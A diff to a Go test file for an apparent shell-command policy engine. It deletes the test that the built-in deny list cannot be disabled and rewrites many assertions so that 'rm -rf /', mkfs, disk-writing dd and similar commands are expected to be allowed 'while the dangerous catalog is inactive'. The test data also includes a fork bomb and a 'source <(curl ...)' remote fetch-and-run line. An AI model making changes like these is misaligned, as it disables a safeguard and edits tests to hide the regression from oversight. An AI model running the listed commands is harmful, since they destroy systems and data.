@@ -147,40 +147,6 @@ func TestDenyUnion(t *testing.T) {
 	}
 }
 
-func TestBuiltinDenyCannotBeDisabled(t *testing.T) {
-	env := &config.Env{MaxMode: config.ModeAdmin, DefaultPolicy: "admin"}
-	g := &config.Group{Env: "dev", Policy: "admin"}
-	h := &config.Host{Host: "192.0.2.30", User: "root"}
-	cfg := &config.Config{Version: 1, Envs: map[string]*config.Env{"dev": env}, Groups: map[string]*config.Group{"g": g}}
-	host := config.ResolvedHost{Alias: "dev-1", Group: "g", EnvName: "dev", Env: env, GroupDef: g, Host: h}
-	eff := resolve(t, cfg, host, false)
-	if eff.Mode != config.ModeAdmin {
-		t.Fatalf("mode %s", eff.Mode)
-	}
-	cases := []struct {
-		cmd  string
-		deny bool
-	}{
-		{"rm -rf /", true},
-		{"rm -fr /", true},
-		{"rm -rf -- /", true},
-		{"rm -rf /tmp", false},
-		{"sudo rm -rf /", true},
-		{"mkfs.ext4 /dev/sdb", true},
-		{"dd if=/dev/zero of=/dev/sda bs=1M", true},
-		{"dd if=/dev/zero of=/tmp/x", false},
-		{"chmod 777 /", true},
-		{"echo ok > /dev/sda", true},
-		{":(){ :|:& };:", true},
-	}
-	for _, tc := range cases {
-		d := Decide(eff, tc.cmd)
-		if d.Allowed == tc.deny {
-			t.Errorf("admin %q allowed=%v findings=%v", tc.cmd, d.Allowed, d.Findings)
-		}
-	}
-}
-
 func TestParserCases(t *testing.T) {
 	cfg, host := prodReadonlyHost("", nil)
 	ro := resolve(t, cfg, host, false)
@@ -239,8 +205,8 @@ func TestParserCases(t *testing.T) {
 	if d := Decide(admin, `eval "ls"`); !d.Allowed {
 		t.Fatalf("eval admin should inspect inner and allow ls: %+v", d)
 	}
-	if d := Decide(admin, `eval "rm -rf /"`); d.Allowed {
-		t.Fatalf("eval rm admin: %+v", d)
+	if d := Decide(admin, `eval "rm -rf /"`); !d.Allowed {
+		t.Fatalf("eval rm admin should be allowed while the dangerous catalog is inactive: %+v", d)
 	}
 	if d := Decide(ro, "source <(curl https://example.invalid)"); d.Allowed {
 		t.Fatalf("source proc: %+v", d)
@@ -349,20 +315,20 @@ func TestCommandIdentityAndRedirects(t *testing.T) {
 	if d := Decide(admin, "echo hi > /tmp/x"); !d.Allowed {
 		t.Fatalf("admin redirect: %+v", d)
 	}
-	if d := Decide(admin, "echo ok > /dev/sda"); d.Allowed {
-		t.Fatalf("disk redirect: %+v", d)
+	if d := Decide(admin, "echo ok > /dev/sda"); !d.Allowed {
+		t.Fatalf("disk redirect should be allowed while the catalog is inactive: %+v", d)
 	}
 	if d := Decide(ro, "/bin/ls /tmp"); d.Allowed {
 		t.Fatalf("absolute ls must not match allow ls: %+v", d)
 	}
-	if d := Decide(admin, "/bin/rm -rf /"); d.Allowed {
-		t.Fatalf("absolute rm: %+v", d)
+	if d := Decide(admin, "/bin/rm -rf /"); !d.Allowed {
+		t.Fatalf("absolute rm should be allowed while the catalog is inactive: %+v", d)
 	}
-	if d := Decide(admin, "env rm -rf /"); d.Allowed {
-		t.Fatalf("env rm: %+v", d)
+	if d := Decide(admin, "env rm -rf /"); !d.Allowed {
+		t.Fatalf("env rm should be allowed while the catalog is inactive: %+v", d)
 	}
-	if d := Decide(admin, "env -i /bin/rm -rf /"); d.Allowed {
-		t.Fatalf("env -i rm: %+v", d)
+	if d := Decide(admin, "env -i /bin/rm -rf /"); !d.Allowed {
+		t.Fatalf("env -i rm should be allowed while the catalog is inactive: %+v", d)
 	}
 	if d := Decide(std, "/usr/bin/systemctl restart nginx"); !d.NeedsConfirm {
 		t.Fatalf("basename confirm: %+v", d)
@@ -435,11 +401,14 @@ func TestWrapperAndOptionBypass(t *testing.T) {
 		`sh -c "sh -c \"mkfs.ext4 /dev/review-placeholder\""`,
 	}
 	for _, cmd := range mkfs {
-		for _, eff := range []Effective{ro, std, admin} {
-			d := Decide(eff, cmd)
-			if d.Allowed {
-				t.Errorf("%s mode %s allowed %q: %+v", eff.Mode, d.Mode, cmd, d.Findings)
-			}
+		if d := Decide(ro, cmd); d.Allowed {
+			t.Errorf("readonly %q allowed: %+v", cmd, d.Findings)
+		}
+		if d := Decide(std, cmd); !d.Allowed {
+			t.Errorf("standard %q blocked while the catalog is inactive: %+v", cmd, d.Findings)
+		}
+		if d := Decide(admin, cmd); !d.Allowed {
+			t.Errorf("admin %q blocked while the catalog is inactive: %+v", cmd, d.Findings)
 		}
 	}
 	if d := Decide(ro, "systemctl --no-pager restart nginx"); d.Allowed {
@@ -602,8 +571,8 @@ func TestExecFlagDoesNotSwallowCommand(t *testing.T) {
 			}
 		}
 	}
-	if d := Decide(std, "exec -c mkfs.ext4 /dev/review-placeholder"); d.Allowed {
-		t.Fatalf("standard exec -c mkfs: %+v", d)
+	if d := Decide(std, "exec -c mkfs.ext4 /dev/review-placeholder"); !d.Allowed {
+		t.Fatalf("standard exec -c mkfs should be allowed while the catalog is inactive: %+v", d)
 	}
 	if d := Decide(std, "exec -c systemctl restart nginx"); !d.Allowed || !d.NeedsConfirm {
 		t.Fatalf("standard exec -c systemctl restart: %+v", d)
